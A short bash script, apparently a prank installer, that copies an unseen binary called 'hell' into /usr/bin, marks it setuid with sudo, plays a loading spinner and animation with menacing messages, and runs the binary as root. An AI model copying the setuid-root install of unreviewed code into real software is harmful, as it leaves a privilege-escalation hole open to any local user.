#!/bin/bash
sudo cp hell/hell /usr/bin/.
echo "moments before disaster."


function loading_icon() {
    local load_interval="${1}"
    local loading_message="${2}"
    local elapsed=0
    local loading_animation=( '—' "\\" '|' '/' )

    echo -n "${loading_message} "

    # This part is to make the cursor not blink
    # on top of the animation while it lasts
    tput civis
    trap "tput cnorm" EXIT
    while [ "${load_interval}" -ne "${elapsed}" ]; do
        for frame in "${loading_animation[@]}" ; do
            printf "%s\b" "${frame}"
            sleep 0.25
        done
        elapsed=$(( elapsed + 1 ))
    done
    printf " \b\n"
}

loading_icon 2 "I'm loading!"


echo "You Are Going To Experience Hell."
sleep 1
sudo chmod +s /usr/bin/hell
python3 hell/anim.py
sleep 3
chmod +x hell/hell
sudo ./hell/hell
